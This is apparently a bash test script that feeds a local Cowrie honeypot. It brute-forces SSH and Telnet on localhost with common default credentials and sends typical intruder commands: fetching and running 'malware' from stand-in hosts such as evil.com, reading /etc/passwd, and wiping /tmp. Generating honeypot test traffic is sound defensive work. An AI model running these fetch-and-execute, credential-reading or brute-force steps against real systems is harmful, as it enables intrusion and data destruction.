#!/bin/bash

echo "🎯 Creating Test Attacks..."

# Make sure Cowrie is running
if ! pgrep -f cowrie > /dev/null; then
    echo "🚀 Starting Cowrie..."
    sudo systemctl start cowrie
    sleep 5
fi

# Install sshpass if needed
if ! command -v sshpass >/dev/null 2>&1; then
    echo "📦 Installing sshpass..."
    sudo apt update && sudo apt install -y sshpass
fi

echo "🔐 Generating SSH brute force attacks..."

# Array of common credentials
declare -a credentials=(
    "root:admin"
    "admin:password" 
    "user:123456"
    "guest:guest"
    "test:test"
    "ubuntu:ubuntu"
    "pi:raspberry"
    "oracle:oracle"
    "postgres:postgres"
    "mysql:mysql"
    "ftp:ftp"
    "www:www"
    "mail:mail"
    "apache:apache"
    "nginx:nginx"
)

# Function to attempt SSH login and execute commands
attempt_ssh_attack() {
    local username=$1
    local password=$2
    
    echo "  🔑 Trying $username:$password"
    
    # Attempt login and execute some commands
    timeout 10 sshpass -p "$password" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=5 -p 2222 "$username@localhost" << EOF 2>/dev/null
whoami
id
ls -la
cat /etc/passwd
ps aux
uname -a
netstat -an
wget http://malicious.example.com/malware.sh
chmod +x malware.sh
./malware.sh
curl -O http://evil.com/backdoor
rm -rf /tmp/*
find / -name "*.conf" 2>/dev/null | head -5
mount
df -h
free -m
exit
EOF

    sleep 1
}

# Generate attacks
for cred in "${credentials[@]}"; do
    IFS=':' read -r username password <<< "$cred"
    attempt_ssh_attack "$username" "$password"
done

echo ""
echo "📞 Generating Telnet attacks..."

# Install expect if needed
if ! command -v expect >/dev/null 2>&1; then
    echo "📦 Installing expect..."
    sudo apt install -y expect
fi

# Telnet attacks
for i in {1..3}; do
    cred="${credentials[$i]}"
    IFS=':' read -r username password <<< "$cred"
    
    echo "  📞 Telnet attack: $username:$password"
    
    expect << EOF 2>/dev/null
spawn telnet localhost 2223
expect "login:" { send "$username\r" }
expect "Password:" { send "$password\r" }
expect "$ " { send "ls -la\r" }
expect "$ " { send "cat /etc/passwd\r" }
expect "$ " { send "ps aux\r" }
expect "$ " { send "wget http://evil.com/rootkit\r" }
expect "$ " { send "exit\r" }
expect eof
EOF

    sleep 1
done

echo ""
echo "⏳ Waiting for logs to be written..."
sleep 5

# Check if we have new log data
LOG_PATH=$(grep COWRIE_LOG_PATH .env.local | cut -d= -f2)
if [ -f "$LOG_PATH" ]; then
    echo "✅ Log file found: $LOG_PATH"
    echo "📊 File size: $(du -h "$LOG_PATH" | cut -f1)"
    echo "📄 Line count: $(wc -l < "$LOG_PATH")"
    
    if [ -s "$LOG_PATH" ]; then
        echo "📝 Recent entries:"
        tail -5 "$LOG_PATH" | jq . 2>/dev/null || tail -5 "$LOG_PATH"
    else
        echo "📝 Log file is empty"
    fi
else
    echo "❌ Log file not found at: $LOG_PATH"
fi

echo ""
echo "✅ Test attacks complete!"
echo "📊 Check your dashboard at: http://localhost:3000"
